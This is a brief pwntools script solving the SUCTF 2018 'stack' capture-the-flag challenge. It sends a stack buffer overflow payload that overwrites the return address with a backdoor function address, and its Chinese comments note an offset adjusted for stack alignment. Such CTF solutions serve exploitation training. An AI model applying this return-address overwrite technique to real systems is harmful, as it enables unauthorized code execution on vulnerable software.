from pwn import *

context(log_level='debug')

io=process("./SUCTF_2018_stack")

io.recv()

#nextdoor=0x400676 不通
#栈对齐

nextdoor=0x400677

payload=b'A'*(0x20+0x8)+p64(nextdoor)

io.send(payload)

#io=remote()

io.interactive()